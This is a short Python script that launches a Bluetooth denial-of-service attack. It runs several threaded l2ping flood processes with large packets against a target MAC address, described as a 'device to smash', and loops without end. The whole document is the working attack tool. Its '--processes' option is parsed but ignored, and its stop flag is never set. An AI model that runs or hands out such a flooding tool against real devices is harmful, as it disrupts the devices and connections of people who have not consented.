import subprocess
import threading
import sys
import argparse

stop=False
def l2ping_flood(mac):
    p = subprocess.Popen(["l2ping", "-s", "600", "-f", mac])
    p.communicate()
    return p.returncode

def flood():
    parser = argparse.ArgumentParser()
    parser.add_argument('mac', help='MAC address of device to smash')
    parser.add_argument('-p', '--processes', help='Number of process to run l2ping on. Default is 100', default=100, type=int)
    args = parser.parse_args()
    threads = []
    for i in range(5):
        t = threading.Thread(target=l2ping_flood, args=(args.mac,))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
        
def main():
    while stop==False:    
        flood()

if __name__ == "__main__":
    main()
